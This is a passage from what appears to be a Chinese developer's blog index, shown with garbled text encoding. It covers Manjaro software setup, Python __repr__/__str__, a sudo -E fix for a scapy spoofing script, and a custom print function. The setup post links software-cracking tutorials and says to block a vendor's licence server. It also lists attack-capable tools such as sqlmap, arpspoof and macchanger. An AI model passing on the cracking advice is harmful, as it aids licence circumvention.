msofficeå…¼å®¹è¿˜æ˜¯ä¸å¤ªè¡Œï¼Œä¸è¿‡ï¼Œæœ‰çš„æ ¼å¼ï¼ˆæœ‰çš„æ–‡æ¡£ï¼‰å‰è€…å…¼å®¹å¥½ï¼Œæœ‰çš„åè€…å…¼å®¹å¥½ã€‚</p><ol type="1"><li><p>office</p><p><code>sudo pacman -S ttf-wps-fonts wps-office</code></p></li><li><p>Libreoffice</p><p><code>yay -S libreoffice</code></p></li><li><p>PDF æŸ¥çœ‹ç¼–è¾‘</p><ol type="1"><li><p>è‡ªå¸¦çš„ PDF æŸ¥çœ‹å™¨ï¼šOkular</p></li><li><p>PDF ç¼–è¾‘/æŸ¥çœ‹å™¨</p><p>Windows ä¸‹ Foxit çš„ä¼ä¸šç‰ˆåŠŸèƒ½æå…¶å¼ºå¤§ï¼Œä½†æ˜¯ Linuxä¸‹å¯ä»¥æ¯”è‚©çš„å‡ ä¹æ²¡æœ‰ï¼Œè¾ƒå¥½çš„æœ‰ä¸¤æ¬¾ï¼š</p><ol type="1"><li><p>Master PDF 5.6.20 æœ€æ–°ç‰ˆæœ¬ï¼Œäº²æµ‹å¯ç ´è§£</p><p>å®‰è£…ï¼š <code>yay -S masterpdfeditor</code> ç ´è§£æ•™ç¨‹ï¼š<ahref="https://blogs.porterpan.top/linuxPDF/">è·¨å¹³å°å¥½ç”¨ä¸”å°å·§çš„ pdfé˜…è¯»å™¨</a> æ³¨æ„ï¼šç ´è§£å‰å…ˆå±è”½è®¿é—®ï¼š <code>code-industry.net</code>ï¼Œå±è”½æ–¹æ³•å¾ˆå¤šï¼Œå¯ä»¥å†™å…¥ host æ˜ å°„åˆ° localhost, ä¹Ÿå…ˆå¯¹ master pdfè®¾ç½®ä»£ç†ï¼Œç„¶åé€šè¿‡ Qv2ray è·¯ç”±åŠŸèƒ½å±è”½ã€‚</p></li><li><p>PDF studio</p><p>ç ´è§£æ•™ç¨‹ï¼šä¹Ÿå¯ä»¥æ‰¾åˆ°ï¼Œæˆ‘ä¸‹è½½äº†ä¸€ä»½å…å®‰è£…ç ´è§£ç‰ˆçš„ï¼Œä½†æ˜¯å¿˜äº†åœ¨å“ªé‡Œä¸‹è½½çš„äº†emmã€‚</p></li></ol></li></ol></li></ol><h3 id="é‚®ä»¶">é‚®ä»¶</h3><ol type="1"><li><p>thunderbird</p><p>æ’ä»¶ï¼š <code>Lighting</code> å’Œ<code>Provider for Google Calendar</code></p></li><li><p>birdtray(ç”¨æ¥åå°ç›‘æ§é‚®ä»¶æ¶ˆæ¯ï¼Œå³æ—¶å¼¹çª—æ˜¾ç¤º)</p></li></ol><h3 id="todoist-linux-éå®˜æ–¹å®¢æˆ·ç«¯">Todoist Linux éå®˜æ–¹å®¢æˆ·ç«¯</h3><p><code>yay -S elementary-planner-git</code> <ahref="https://aur.archlinux.org/packages/elementary-planner-git/">elementary-planner</a>æ­é… KDE æ’ä»¶ Event Calendar æ­é… Todoist, Google Calendar åŒæ­¥</p><h3 id="æ–‡çŒ®é˜…è¯»ç®¡ç†">æ–‡çŒ®é˜…è¯»ï¼Œç®¡ç†</h3><p>Zotero æ–‡çŒ®ç®¡ç†ï¼Œcopytranslator è®ºæ–‡ç¿»è¯‘åŠ©æ‰‹</p><p><code>yay -S zotero copytranslator-appimage</code></p><h3 id="æ€ç»´å¯¼å›¾">æ€ç»´å¯¼å›¾</h3><p>Xmind ZEN è·¨å¹³å°çš„æ€ç»´å¯¼å›¾å·¥å…·</p><p>å®‰è£…ï¼š <code>yay -S xmind-zen</code> ç ´è§£æ•™ç¨‹ï¼š<ahref="https://www.ghpym.com/xmindzen.html">XMind 2020 (10.1.3) å…¨å¹³å°å®Œç¾ç ´è§£ç‰ˆ</a></p><h3 id="ç”µå­ä¹¦">ç”µå­ä¹¦</h3><p>ç”µå­ä¹¦ç®¡ç† calibreï¼Œ ç”µå­ä¹¦é˜…è¯» foliate æˆ–è€… bookworm</p><p><code>yay -S foliate calibre</code></p><h3 id="å­—å…¸">å­—å…¸</h3><p><code>yay -S goldendict</code></p><h3 id="åšæœäº‘">åšæœäº‘</h3><p><code>yay -S nutstore-experimental</code></p><h2 id="å½±éŸ³å›¾åƒ">å½±éŸ³å›¾åƒ</h2><h3 id="å½±éŸ³">å½±éŸ³</h3><ol type="1"><li><p>è§†é¢‘</p><p>é»˜è®¤çš„ VLC å¾ˆæ£’</p></li><li><p>éŸ³é¢‘</p><p>æœ¬åœ°éŸ³ä¹æ’­æ”¾å™¨ é»˜è®¤çš„ Cantata ä½œä¸ºæœ¬åœ°éŸ³ä¹æ’­æ”¾å™¨å¾ˆæ£’æ¨èçš„åœ¨çº¿éŸ³ä¹æ’­æ”¾å™¨ï¼š ç½‘æ˜“äº‘éŸ³ä¹ï¼š<code>sudo pacman -S netease-cloud-music</code> listen1ï¼š<code>sudo pacman -S listen1-desktop</code> Spotifyï¼š<code>sudo pacman -S spotify</code> ç›®å‰åœ¨ç”¨ listen1å’Œç½‘æ˜“äº‘éŸ³ä¹ï¼ˆæ³¨ï¼šç›®å‰ç½‘æ˜“äº‘çš„åŒ…ä¸èƒ½æœç´¢ä¸­æ–‡ï¼Œæˆ‘å‡ ä¹ä¸ç”¨æœç´¢ï¼Œæ‰€ä»¥æ²¡ç®¡å®ƒï¼‰</p></li><li><p>è§†é¢‘å½•åƒ</p><p><code>yay -S simplescreenrecorder</code></p></li></ol><h3 id="å›¾åƒ">å›¾åƒ</h3><ol type="1"><li><p>å›¾åƒ</p><ol type="1"><li><p>çœ‹å›¾è‡ªå¸¦çš„ Gwenview</p></li><li><p>ç®€å•ç”»å›¾ KolourPaintï¼Œ ç±»ä¼¼ Microsoft Paint</p><p><code>sudo pacman -S kolourpaint</code></p></li><li><p>ç®€å•ä¿®å›¾ï¼Œç¼–è¾‘å›¾ç‰‡ pinta</p><p><code>sudo pacman -S pinta</code> æœ€è¿‘æ‰ä¸‹è½½ä½¿ç”¨pintaï¼Œæœªæ·±åº¦ä½¿ç”¨ï¼Œæ•ˆæœæš‚å®š</p></li></ol></li><li><p>æˆªå›¾</p><p>è‡ªå¸¦çš„ Spectacle ä¸ Flameshot è´´å›¾</p><p><code>yay -S flameshot</code></p></li><li><p>æ¢å£çº¸è½¯ä»¶</p><p>variety å…¨å¹³å°æœ€å¥½çš„é™æ€å£çº¸è½¯ä»¶ï¼Œæ²¡æœ‰ä¹‹ä¸€<code>yay -S variety</code></p></li></ol><h2 id="kde-ç¯å¢ƒé…ç½®">KDE ç¯å¢ƒé…ç½®</h2><h3 id="open-files">Open Files</h3><p>KDE é»˜è®¤æ˜¯å•å‡»æ‰“å¼€æ–‡ä»¶ï¼Œä½†æ˜¯ä½œä¸ºå‰ Windowsç”¨æˆ·ï¼Œæˆ‘ä¸æ˜¯å¾ˆä¹ æƒ¯ï¼Œæ”¹ï¼š</p><p><code>System Settings &gt; Workspace Behavior &gt; General Behavior &gt; Click Behavior &gt; Double-Click to open files and folders(single click to select) .</code></p><h3 id="screen-edge">Screen Edge</h3><p>ä½œä¸ºå‰ Windowsç”¨æˆ·ï¼Œæå…¶ä¸ä¹ æƒ¯å½“é¼ æ ‡ç§»åŠ¨åˆ°å·¦ä¸Šè§’æ˜¾ç¤ºæ¡Œé¢çš„æ‰‹åŠ¿æ“ä½œï¼Œå…³äº†å®ƒï¼š</p><p><code>System Settings &gt; Workspace Behavior &gt; Screen Edges</code>ï¼Œå•å‡»ä¸‹å›¾ä¸­ç®­å¤´æŒ‡çš„é‚£ä¸ªäº®å—ï¼ˆå¯¹ï¼Œå®ƒæ˜¯èƒ½ç‚¹çš„ï¼Œç„¶åæœ‰èœå•ï¼Œé€‰æ‹© No actionå³å¯ï¼‰</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724101651.png"alt="Screen Edges" /><figcaption aria-hidden="true">Screen Edges</figcaption></figure><h3 id="æ•´ä½“å­—ä½“å¤ªå°">æ•´ä½“å­—ä½“å¤ªå°</h3><p>ä¿®æ”¹å­—ä½“å’Œ DPIï¼š<code>System Settings &gt; Workspace Behavior &gt; Fonts</code></p><p>æˆ‘çš„é…ç½®å¦‚å›¾ï¼š</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200724102022.png"alt="fonts" /><figcaption aria-hidden="true">fonts</figcaption></figure><h3 id="dock">Dock</h3><p><code>yay -S latte-dock-git</code></p><h2 id="å…¶ä»–">å…¶ä»–</h2><h3 id="virtualbox">virtualbox</h3><p><ahref="https://wiki.manjaro.org/index.php?title=Virtualbox#Install_VirtualBox">VirtualBoxmanjaro å®‰è£…</a></p><p>æ³¨æ„ä»¥ä¸‹ï¼š <code>linux54-virtualbox-host-modules</code> ä¸­çš„ 54å¯¹åº”è‡ªå·±å†…æ ¸çš„æ•°å­—</p><p><ahref="https://blog.csdn.net/wow4464/article/details/51778449">VirtualBoxè™šæ‹Ÿæœºå…¨å±æ˜¾ç¤º</a></p><p>å®‰è£…æ‰©å±•æ”¯æŒ USB 3.0</p><p><code>yay -S virtualbox-ext-oracle</code></p><h3 id="è¿œç¨‹">è¿œç¨‹</h3><p><code>yay -S remmina teamviewer</code></p><h3 id="ä¸‹è½½">ä¸‹è½½</h3><p><code>yay -S baidunetdisk-bin aria2 xdman</code></p><h3 id="tim">Tim</h3><p><code>yay -S deepin-wine-tim</code></p><h2 id="ç½‘ç»œå®‰å…¨">ç½‘ç»œã€å®‰å…¨</h2><ol type="1"><li><code>netcat</code> åŒ…å«åœ¨ <code>nmap</code> åŒ…é‡Œé¢</li><li><code>dig</code> , <code>host</code> , <code>nslookup</code> ï¼Œ<code>ip</code> ï¼ˆå…¨åï¼š <code>iproute2</code> ï¼Œ ä½¿ç”¨æ—¶ç›´æ¥<code>ip</code> ï¼‰éƒ½åœ¨ <code>bind-tools</code> åŒ…é‡Œã€‚</li><li><code>dsniff</code> ï¼š åŒ…å« <code>arpspoof</code> å‘½ä»¤</li><li><code>fping</code> ï¼Œ <code>traceroute</code></li><li><code>macchanger</code> ï¼šæ”¹å˜ mac åœ°å€</li></ol><p>å®‰è£…ï¼š<code>yay -S bind-tools fping traceroute nmap sqlmap macchanger dsniff</code></p><h3 id="wireshark-å®‰è£…">wireshark å®‰è£…</h3><p><code>yay -S wireshark-qt</code> å°†ç”¨æˆ·åŠ å…¥ wireshark ç»„ï¼š<code>gpasswd -a username wireshark</code> ï¼ˆusernameæ”¹ä¸ºä½ çš„ç”¨æˆ·åï¼‰</p><h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2><blockquote><ol type="1"><li><a href="https://blog.triplez.cn/manjaro-quick-start/">å°†å¹²å‡€çš„Manjaro å¿«é€Ÿé…ç½®ä¸ºå·¥ä½œç¯å¢ƒ</a></li><li><a href="https://sshwy.gitee.io/2019/04/14/24636/">Yayä½¿ç”¨å°è®°</a></li><li><a href="https://www.cnblogs.com/tomyyyyy/p/12902714.html">Manjaroé…ç½®</a></li><li><a href="https://github.com/rofl0r/proxychains-ng">Githubproxychains-ng</a></li><li><a href="https://www.cnblogs.com/misfit/p/10694397.html">Oh-My-ZshåŠä¸»é¢˜ã€æ’ä»¶å®‰è£…ä¸é…ç½®</a></li><li><a href="https://zh.wikipedia.org/wiki/Manjaro_Linux">ManjaroLinux</a></li><li><ahref="https://www.edureka.co/community/37886/not-able-to-install-arpspoof">Notable to install arpspoof</a></li><li><a href="https://zhuanlan.zhihu.com/p/65767238">Manjaroå®‰è£…å¥—è·¯</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>__str__ã€__repr__ å’Œ __ascii__</title>
      <link href="/blog/2020/07/22/programming/python/2.object-oriented/str_repr/"/>
      <url>/blog/2020/07/22/programming/python/2.object-oriented/str_repr/</url>
      
        <content type="html"><![CDATA[<p>å½“ä½ ç›´æ¥è¾“å‡ºä¸€ä¸ªè‡ªå®šä¹‰å¯¹è±¡æ—¶ï¼Œè¾“å‡ºç»“æœæ¥è‡ªäºï¼š</p><ol type="1"><li>ä½ é‡å†™çš„ï¼Œ<code>__str__</code> çš„è¿”å›å€¼</li><li>å¦‚æœä½ æ²¡æœ‰é‡å†™ <code>__str__</code>ï¼Œ åˆ™ä½¿ç”¨ä½ é‡å†™çš„<code>__repr__</code> çš„è¿”å›å€¼</li><li>å¦‚æœä½ ä¸¤ä¸ªéƒ½æ²¡æœ‰é‡å†™ï¼Œåˆ™ä¸è¾“å‡ºä¸œè¥¿ã€‚</li></ol><h2 id="repr__"><code>__repr__</code></h2><p><code>__repr__</code>ï¼ˆrepresentations of pythonobjectï¼‰çš„ç›®çš„ä¸ºäº†æ›´åŠ ä½¿æ„æ€æ¸…æ¥šï¼Œæ¶ˆé™¤æ­§ä¹‰ã€‚å®ƒæ˜¯ç»™å¼€å‘è€…å‡†å¤‡çš„ï¼Œç”¨æ¥è°ƒè¯•ã€‚</p><p>åŠŸèƒ½ï¼š</p><ol type="1"><li><p>ä¸ºäº†æ˜¯ shiè¯¥å¯¹è±¡æ›´å®¹æ˜“è¢«ç¨‹åºå‘˜ç†è§£ã€‚ç»ˆç«¯ç”¨æˆ·è¾“å‡ºä¸€äº›ä¿¡æ¯</p></li><li><p>æ–­ç‚¹è°ƒè¯• é€šè¿‡é‡å†™ â€œ<strong>repr</strong>()â€,è¾“å‡ºå¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥è¾“å‡ºè¯¥å¯¹è±¡çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¸ºä½  Debugç­‰æä¾›å¸®åŠ©ã€‚</p></li><li><p>å»ºè®®ä¸ºä»»ä½•è‡ªå®šä¹‰çš„ç±»é‡å†™ <code>__repr__</code></p></li><li><p>Containerâ€™s <code>__str__</code> uses contained objects<code>__repr__</code></p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obj</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, value</span>):</span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;this is  __str__, it&#x27;s value is <span class="subst">&#123;self.value&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;this is  __repr__, it&#x27;s value is <span class="subst">&#123;self.value&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">a = obj(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#123;!r&#125;\n\n&#123;!s&#125;&quot;</span>.<span class="built_in">format</span>(a.__repr__, a.__str__))</span><br></pre></td></tr></table></figure><h2 id="str__"><code>__str__</code></h2><p><code>__str__</code> çš„ç›®çš„ä¸ºäº†å¯è¯»æ€§ï¼Œæ˜¯ä¸ºï¼ˆç»ˆç«¯ï¼‰ç”¨æˆ·å‡†å¤‡çš„</p><p><code>str()</code> å‡½æ•°è°ƒç”¨çš„å°±æ˜¯å¯¹è±¡çš„ <code>__str__</code>æ–¹æ³•ã€‚</p><p>å¦‚æœä½ å¸Œæœ›æœ‰ä¸€ä¸ªå­—ç¬¦ä¸²ç‰ˆæœ¬çš„å¯è¯»æ€§æ¯”è¾ƒå¥½çš„è¾“å‡ºï¼Œé‚£ä¹ˆå†å®ç°ä¸€ä¸‹<code>__str__</code></p><p>!s (apply str()) and !r (apply repr()) can be used to convert thevalue before it is formatted.</p><h2 id="section"></h2><p>It just calls the repr of the value supplied.</p><p>It's usage is generally not really needed with f-strings since withthem you can just do repr(self.radius) which is arguably more clear inits intent.</p><p>!r (repr), !s (str) and !a (ascii) were kept around just to easecompatibility with the str.format alternative, you don't need to usethem with f-strings.</p><h2 id="references">References</h2><p><ahref="https://medium.com/swlh/string-representations-in-python-understand-repr-vs-str-12f046986eb5">StringRepresentations in Python â€” Understand repr() vs. str()</a> <ahref="https://stackoverflow.com/questions/38418070/what-does-r-do-in-str-and-repr">Whatdoes !r do in str() and repr()?</a> <ahref="https://stackoverflow.com/questions/44800801/in-python-format-f-string-strings-what-does-r-mean">InPython format (f-string) strings, what does !r mean?</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python å®‰è£…ç›®å½•ï¼Œä¿®æ”¹ï¼Œpip é»˜è®¤åŒ…å®‰è£…ä½ç½®</title>
      <link href="/blog/2020/07/21/programming/python/issues/py_config/"/>
      <url>/blog/2020/07/21/programming/python/issues/py_config/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />wait to be learned</label></li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><p><a href="https://docs.python.org/3/library/site.html">site â€”Site-specific configuration hook</a> &gt; <ahref="https://blog.csdn.net/ZCShouCSDN/article/details/84990674">Pythonä¹‹ æ–°æ‰‹å®‰è£…è¯¦è§£ ã€å®‰è£…ç›®å½•è¯´æ˜ åŠ ä¿®æ”¹ pip é»˜è®¤åŒ…å®‰è£…ä½ç½®</a> &gt; <ahref="https://frostming.com/2019/03-13/where-do-your-packages-go">ä½ çš„Python åŒ…éƒ½è£…åˆ°å“ªäº†ï¼Ÿ</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python root ç”¨æˆ·æŠ¥é”™ ModuleNotFoundError</title>
      <link href="/blog/2020/07/21/programming/python/issues/sudo_no_mod/"/>
      <url>/blog/2020/07/21/programming/python/issues/sudo_no_mod/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åœ¨ sudo æ¨¡å¼ä¸‹ï¼Œè¿è¡Œï¼ŒPythonè„šæœ¬æ–‡ä»¶æ—¶ï¼Œä¹Ÿé‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œä½†é‚£æ˜¯é‡åˆ°çš„æ¨¡å—æ–‡ä»¶éƒ½æ˜¯å¯ä»¥åœ¨ç”¨æˆ·æƒé™ä¸‹è¿è¡Œçš„ï¼Œæˆ‘åªæ˜¯ä¸å°å¿ƒåœ¨è¿™é‡Œroot ä¸‹æƒ³è¿è¡Œè€Œå·²ã€‚</p><h2 id="é—®é¢˜">é—®é¢˜</h2><p>ä»Šå¤©åœ¨å­¦ä¹  scapy æ¨¡å—è¿›è¡Œäº† IP æ¬ºéª—çš„æ—¶å€™ï¼Œæˆ‘å‘ç°å®ƒå¿…é¡»åœ¨è¿™é‡Œ rootæƒé™ä¸‹è¿è¡Œï¼Œå¦åˆ™æŠ¥é”™<code>PermissionError: [Errno 1] Operation not permitted</code>ï¼Œä½†æ˜¯root ä¸‹ç”¨æˆ·è¿˜æŠ¥é”™ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python spoofing.py</span><br><span class="line">[sudo] password <span class="keyword">for</span> violetv:</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;spoofing.py&quot;</span>, line <span class="number">3</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    <span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">ModuleNotFoundError: No module named <span class="string">&#x27;scapy&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="è§£å†³æ–¹æ³•">è§£å†³æ–¹æ³•</h2><p>ä½¿ç”¨çš„ <code>sudo</code> å‘½ä»¤çš„ <code>-E</code> é€‰é¡¹,<code>sudo -E python spoofing.py</code></p><h2 id="åŸå› ">åŸå› </h2><p>ç”±äºå®‰å…¨ç­–ç•¥ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ rootç”¨æˆ·ä¸ä¼šåŠ è½½æ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ï¼ˆè¿™é‡ŒæŒ‡ Python çš„ç¯å¢ƒå˜é‡ï¼‰ï¼Œè€Œæˆ‘çš„Python åŒ…åˆæ˜¯åªå®‰è£…åœ¨ç”¨æˆ·ç›®å½•ä¸‹çš„ï¼Œå› æ­¤æŠ¥é”™ã€‚</p><p>å¯ä»¥é€šè¿‡ä½¿ç”¨ <code>sudo</code> çš„ <code>-E</code>é€‰é¡¹å‘Šè¯‰å®‰å…¨ç­–ç•¥ï¼Œç”¨æˆ·æƒ³è¦åœ¨åˆ‡æ¢åˆ° sudo ä¹‹åä¿ç•™è‡ªå·±çš„ç¯å¢ƒå˜é‡ã€‚</p><p>é€šè¿‡äº† <code>man sudo</code> å¯å¾—ï¼š</p><blockquote><p>-E, --preserve-env</p></blockquote><pre><code>    Indicates to the security policy that the user wishes to    preserve their existing environment variables.  The secuâ€    rity policy may return an error if the user does not have    permission to preserve the environment.</code></pre><blockquote><p>--preserve-env=list</p></blockquote><pre><code>    Indicates to the security policy that the user wishes to    add the comma-separated list of environment variables to    those preserved from the user&#39;s environment.  The security    policy may return an error if the user does not have perâ€    mission to preserve the environment.  This option may be    specified multiple times.</code></pre><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><p><ahref="https://stackoverflow.com/questions/50315645/cannot-run-python-script-using-sudo">Cannotrun Python script using sudo</a> &gt; <ahref="https://stackoverflow.com/questions/7969540/pythonpath-not-working-for-sudo-on-gnu-linux-works-for-root">PYTHONPATHnot working for sudo on GNU/Linux (works for root)</a> &gt; <ahref="https://blog.csdn.net/ZCShouCSDN/article/details/84990674">Pythonä¹‹ æ–°æ‰‹å®‰è£…è¯¦è§£ ã€å®‰è£…ç›®å½•è¯´æ˜ åŠ ä¿®æ”¹ pip é»˜è®¤åŒ…å®‰è£…ä½ç½®</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>è‡ªå·±å®ç° python print å‡½æ•°</title>
      <link href="/blog/2020/07/21/programming/python/problems/self_print/"/>
      <url>/blog/2020/07/21/programming/python/problems/self_print/</url>
      
        <content type="html"><![CDATA[<p>ä»Šå¤©å¤ä¹  Python çš„è¾“å…¥è¾“å‡ºï¼Œçœ‹åˆ°ä¹‹å‰çš„ç¬”è®°åªå†™äº† print çš„åº•å±‚æ˜¯sys.stdoutï¼Œ è€Œæ²¡æœ‰å†ç»†è¯´ã€‚äºæ˜¯ï¼Œå¿ƒæƒ³å®ƒæ˜¯æ€ä¹ˆä½¿ç”¨ sys.stdout å®ç°çš„å‘¢ï¼Ÿäºæ˜¯åˆä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ python å‡½æ•°çš„å„ä¸ªå‚æ•°ï¼Œé‚è‡ªå·±å†™äº†ä¸€ä¸ª printã€‚å°±å½“ç»ƒä¹ è¯­æ³•å’Œç©è€äº†ï¼Œå“ˆå“ˆã€‚</p><h2 id="çŸ¥è¯†ç‚¹">çŸ¥è¯†ç‚¹</h2><ol type="1"><li><p>å¤šå€¼å‚æ•° ä¸€ä¸ª <code>*</code>ï¼š å…ƒç»„; ä¸¤ä¸ªæ˜Ÿ <code>*</code>:å­—å…¸</p></li><li><p>åˆ—è¡¨æ¨å¯¼å¼</p></li><li><p><code>sys.stdout</code> æ ‡å‡†è¾“å‡ºæµ</p></li><li><p><ahref="https://docs.python.org/zh-cn/3.8/library/typing.html">Pythonç±»å‹æ ‡æ³¨æ”¯æŒ</a></p><ul class="task-list"><li><label><input type="checkbox" />Python ç±»å‹æ ‡æ³¨</label></li></ul></li><li><p>if-else è¡¨è¾¾å¼ï¼Œè¿˜æ˜¯ <code>or</code> å†™çš„è¿‡ç¨‹ä¸­ï¼Œ æˆ‘æœ¬æ¥å‡†å¤‡å°†<code>file</code> å‚æ•°è®¾ç½®æˆ <code>None</code> çš„ï¼Œå› ä¸ºæŒ‰ç†è¯´ï¼Œå¯å˜å¯¹è±¡å‚æ•°éœ€è¦ä½¿ç”¨ Noneä½œä¸ºçš„é»˜è®¤å€¼ï¼Œä»è€Œé¿å…å¯¹ç¼–è¯‘æ—¶ç”Ÿæˆçš„é»˜è®¤å‚æ•°å¯¹è±¡è¿›è¡Œä¿®æ”¹ï¼Œé€ æˆæ„å¤–äº‹æ•…ã€‚</p><p>å¦‚æœè¦ä½¿ç”¨ <code>file=None</code> çš„è¯ï¼Œé‚£è¾“å‡ºé‚£é‡Œå°±éœ€è¦åˆ¤æ–­ä¸€ä¸‹</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> file:</span><br><span class="line">    file.write(output_content)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sys.stdout.write(output_content)</span><br></pre></td></tr></table></figure></p><p>ä½†æ˜¯ï¼Œæ„Ÿè§‰å¾ˆä¸ç®€æ´ï¼Œäºæ˜¯ä½¿ç”¨ <code>or</code> è¿›è¡Œæ¡ä»¶åˆ¤æ–­ï¼Œå¹¶å¥½å¥‡if-else å’Œ or çš„ä¼˜åŠ£ï¼Œå°±æœç´¢åˆ°äº† <ahref="https://stackoverflow.com/questions/51802974/if-else-vs-or-operation-for-none-check">stackoverflowçš„æ–‡ç« </a>ï¼Œè¿˜æ˜¯ <code>or</code> æ€§èƒ½å¥½ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.stdout = file <span class="keyword">or</span> sys.stdout</span><br><span class="line">sys.stdout.write(output_content)</span><br></pre></td></tr></table></figure></p><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://foofish.net/python-tricks.html">Pythoné™·é˜±ï¼šä¸ºä»€ä¹ˆä¸èƒ½ç”¨å¯å˜å¯¹è±¡ä½œä¸ºé»˜è®¤å‚æ•°çš„å€¼</a></label></li></ul></li><li><p>æœ€ç»ˆæˆ‘åˆæ¢æˆäº† <code>file=sys.stdout</code>ï¼Œæ ¹æ®ï¼š</p><ol type="1"><li><p><ahref="https://stackoverflow.com/questions/42762120/sys-stdout-as-default-function-argument">stackoverflowä¸€ç¯‡æ–‡ç« </a></p></li><li><p><ahref="https://docs.python.org/3.5/library/functions.html?highlight=built#print">Pythonå®˜æ–¹æ–‡æ¡£ print é»˜è®¤å‚æ•°</a></p></li></ol></li></ol><h2 id="ä»£ç ">ä»£ç </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_print</span>(<span class="params">*obj, sep: <span class="built_in">str</span> = <span class="string">&quot; &quot;</span>, end: <span class="built_in">str</span> = <span class="string">&quot;\n&quot;</span>, file=sys.stdout, flush: <span class="built_in">bool</span> = <span class="literal">False</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"></span><br><span class="line">    str_converted = [<span class="built_in">str</span>(obj_item) <span class="keyword">for</span> obj_item <span class="keyword">in</span> obj]</span><br><span class="line">    output_content = sep.join(str_converted)+end</span><br><span class="line"></span><br><span class="line">    file.write(output_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flush:</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># ä½¿ç”¨æµ‹è¯•</span></span><br><span class="line">    my_print(<span class="string">&quot;You&quot;</span>, <span class="string">&quot;Me&quot;</span>, sep=<span class="string">&quot; ^--^ &quot;</span>, end=<span class="string">&quot;\nGo!\n&quot;</span>)</span><br><span class="line">    my_print([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>), &#123;</span><br><span 